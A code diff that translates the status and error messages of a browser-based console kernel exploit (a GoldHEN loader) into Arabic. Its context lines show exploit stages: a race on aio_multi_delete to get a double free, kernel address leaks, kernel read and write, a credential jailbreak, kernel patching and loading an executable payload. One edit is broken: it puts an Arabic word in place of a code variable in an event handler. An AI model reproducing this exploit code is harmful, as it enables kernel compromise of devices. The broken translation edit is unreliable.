@@ -36,14 +36,14 @@ const lines = [];
 function hostOk() {
     var m = document.getElementById("msgs");
     if (m) {
-        m.innerHTML = "GoldHEN Loaded ...";
+        m.innerHTML = "تم تحميل GoldHEN بنجاح";
     }
 }
 
 function hostFail() {
     var m = document.getElementById("msgs");
     if (m) {
-        m.innerHTML = "Failed to Load! Restart Your Console ...";
+        m.innerHTML = "تعذّر التحميل. أعد تشغيل الجهاز ثم حاول مجدداً.";
         m.style.color = "yellow";
     }
 }
@@ -329,14 +329,14 @@ function makeRpc(worker) {
                   + "WITHHELD. Nothing is freed twice and no reboot is owed."
                 : "  -- ARMED: the worker issues a REAL aio_multi_delete"));
 
-        state("running the primitive...", "warn");
+        state("جارٍ تشغيل مكوّن الاستغلال...", "warn");
 
         await new Promise(function (r) { setTimeout(r, 0); });
         const carrier = await establishPrimitive({
             maxAttempts: 6,
 
             onEvent: function (tag, detail, attempt) {
-                mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
+                mark(tag, (المحاولة != null ? '[' + المحاولة + '] ' : '')
                     + (detail || ''));
             }
         });
@@ -421,7 +421,7 @@ function makeRpc(worker) {
         const wanted = [];
         for (const k in SYS) wanted.push(SYS[k]);
         for (const k in SYS9) wanted.push(SYS9[k]);
-        state("scanning libkernel for syscall stubs...", "warn");
+        state("جارٍ فحص libkernel للعثور على استدعاءات النظام...", "warn");
         const tScan = Date.now();
         const stubRva = new Map();
 
@@ -676,7 +676,7 @@ function makeRpc(worker) {
                 mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
                 var m = document.getElementById("msgs");
                 if (m) {
-                    m.innerHTML = "GoldHEN is Already Loaded ...";
+                    m.innerHTML = "GoldHEN يعمل بالفعل";
                 }
                 return;
             }
@@ -738,7 +738,7 @@ function makeRpc(worker) {
                 return c.join(",");
             })() + " are available to this process)");
 
-        state("wiring the worker...", "warn");
+        state("جارٍ تجهيز عامل التنفيذ...", "warn");
         worker = new Worker("slopkit/rpc_worker.js");
         rpc = makeRpc(worker);
         await rpc("ping");
@@ -799,7 +799,7 @@ function makeRpc(worker) {
         check("worker-answers-before-arm",
             (await rpc("ping")) === "pong", "");
 
-        state("setting up the aio batches...", "warn");
+        state("جارٍ إعداد دفعات AIO...", "warn");
         const pairBuf = alloc(8);
         if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
             throw new Error("socketpair failed");
@@ -837,7 +837,7 @@ function makeRpc(worker) {
         }
         mark("SPRAY-CANCELLED", "");
 
-        state("dry run: everything but the racing delete...", "warn");
+        state("اختبار تمهيدي للخطوات قبل تنفيذ الحذف المتزامن...", "warn");
         servAddr.dv.setUint8(0, 16);
         servAddr.dv.setUint8(1, AF_INET);
         servAddr.dv.setUint16(2, 0x8d13, true);
@@ -1076,7 +1076,7 @@ function makeRpc(worker) {
             return null;
         }
 
-        state("racing...", "warn");
+        state("جارٍ تنفيذ سباق التوقيت...", "warn");
         mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
             + "  -- the worker now issues a REAL aio_multi_delete");
 
@@ -1118,7 +1118,7 @@ function makeRpc(worker) {
             const conn = sc(SYS.accept, server, 0, 0).i32;
             if (cr !== 0 || conn === -1) {
                 sc(SYS.close, client);
-                setupFail = "attempt " + it + " connect=" + cr + " accept=" + conn;
+                setupFail = "المحاولة " + it + " connect=" + cr + " accept=" + conn;
                 break;
             }
             sc(SYS.setsockopt, client, SOL_SOCKET, SO_LINGER, lingerBuf.addr, 8);
@@ -1351,7 +1351,7 @@ function makeRpc(worker) {
             mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                 + " now alias one 0x80 allocation");
 
-            state("leaking kernel addresses...", "warn");
+            state("جارٍ قراءة عناوين النواة...", "warn");
             const leakOk = (function () {
                 function getRthdr(sock, size) {
                     leakLen.dv.setInt32(0, size, true);
@@ -1582,7 +1582,7 @@ function makeRpc(worker) {
                     + " dirty_fd=" + dirty);
                 mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
 
-                state("stage 3: crafting the aio queue entry...", "warn");
+                state("المرحلة 3: تجهيز عنصر قائمة AIO...", "warn");
 
                 sc(SYS.evf_delete, evf);
                 mark("EVF-DELETED", hx(evf));
@@ -1772,7 +1772,7 @@ function makeRpc(worker) {
                     + " alias one 0x100 allocation. make_karw is step 4i, and "
                     + "it is the first point where any of this can be repaired.");
 
-                state("stage 4: kernel read...", "warn");
+                state("المرحلة 4: قراءة النواة...", "warn");
 
                 sprayRthdr.u8.fill(0);
                 const karwLen = buildRthdr(sprayRthdr, 0x100);
@@ -2052,7 +2052,7 @@ function makeRpc(worker) {
                 mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                     + kreadFail + " failed");
 
-                state("stage 5: kernel write...", "warn");
+                state("المرحلة 5: الكتابة في النواة...", "warn");
 
                 const kwTarget = pktinfoSelf.sub32(8);
                 const KW_A = 0x4b571337, KW_B = 0xfeedc0de;
@@ -2123,7 +2123,7 @@ function makeRpc(worker) {
                             + "aim=verified selfref=restored");
                 }
 
-                state("stage 6: locating the kernel base...", "warn");
+                state("المرحلة 6: تحديد عنوان بداية النواة...", "warn");
                 const KSTR_RESIDUE = evfCv.low & 0x3fff;
                 const KSTR_LO = params.has("kstrlo")
                     ? parseInt(params.get("kstrlo"), 16) : 0x780000;
@@ -2298,7 +2298,7 @@ function makeRpc(worker) {
                                     + "the cleanup list -- closing master would "
                                     + "kmem_free slave's struct pipe");
 
-                                state("building KernelView...", "warn");
+                                state("جارٍ تجهيز عرض النواة...", "warn");
 
                                 function toI64(v) {
                                     return (typeof v === "number")
@@ -2732,7 +2732,7 @@ function makeRpc(worker) {
                                         + "nothing is closed.");
                                 } else {
 
-                                state("stage 7: repairing the aliases...", "warn");
+                                state("المرحلة 7: إصلاح العناوين البديلة...", "warn");
 
                                 const PKTOPTS_M = 0x00;
                                 const PKTOPTS_RTHDR = 0x68;
@@ -2962,7 +2962,7 @@ function makeRpc(worker) {
                                         + "writes on top of that is how a clean "
                                         + "failure becomes a panic.");
                                 } else try {
-                                    state("stage 8: jailbreak...", "warn");
+                                    state("المرحلة 8: تنفيذ الجيلبريك...", "warn");
 
                                     const P_LIST_NEXT = 0x00, P_LIST_PREV = 0x08;
                                     const P_UCRED = 0x40, P_FD = 0x48, P_PID = 0xb0;
@@ -3167,7 +3167,7 @@ function makeRpc(worker) {
                                         + " kbase=" + (kbase || "null")
                                         + " blob=" + (kpatch ? kpatch.length : 0));
                                 } else try {
-                                    state("stage 9: kernel patches...", "warn");
+                                    state("المرحلة 9: تطبيق تعديلات النواة...", "warn");
                                     const sysent = kbase.add32(SYSENT_661);
                                     const gadget = kbase.add32(JMP_RSI_GADGET);
 
@@ -3381,7 +3381,7 @@ function makeRpc(worker) {
                                     mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                 else if (payload && (kpatched || params.get("payload") === "1"))
                                     try {
-                                    state("stage 10: loading the payload...", "warn");
+                                    state("المرحلة 10: تحميل الحمولة...", "warn");
 
                                     const psize = (payload.length + 0x3fff) & ~0x3fff;
                                     const pr = PROT_READ | PROT_WRITE | PROT_EXEC;
@@ -3618,17 +3618,17 @@ function makeRpc(worker) {
             if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
                 + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
         } else if (committed) {
-            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
+            state("تم تحرير المورد دون استعادته؛ أعد تشغيل الجهاز الآن", "bad");
             hostFail();
         } else {
-            state("no win in " + attemptsUsed + " attempts", "warn");
+            state("لم تنجح العملية بعد " + attemptsUsed + " محاولة", "warn");
             hostFail();
         }
 
     } catch (e) {
         mark("FAILED", e && e.message ? e.message : String(e));
         try {
-            stateEl.textContent = "FAILED -- see log";
+            stateEl.textContent = "فشلت العملية؛ راجع سجل التفاصيل";
             stateEl.className = "bad";
         } catch (e2) { }
         hostFail();
@@ -3834,7 +3834,7 @@ function makeRpc(worker) {
             mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
                 + "browser normally. power the console off and back on.");
             try {
-                stateEl.textContent = "REBOOT THE CONSOLE";
+                stateEl.textContent = "أعد تشغيل الجهاز";
                 stateEl.className = "bad";
             } catch (e) { }
             if (!payloadRunning) {
@@ -3858,7 +3858,7 @@ function makeRpc(worker) {
                     : "") + ". See the stage 8/9/10 marks for what is left.");
             try {
                 stateEl.textContent = payloadRunning
-                    ? "ALL DONE"
+                    ? "اكتملت العملية"
                     : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                     : jailbroken ? "ROOT -- NO REBOOT NEEDED"
                     : "REPAIRED -- NO REBOOT NEEDED";
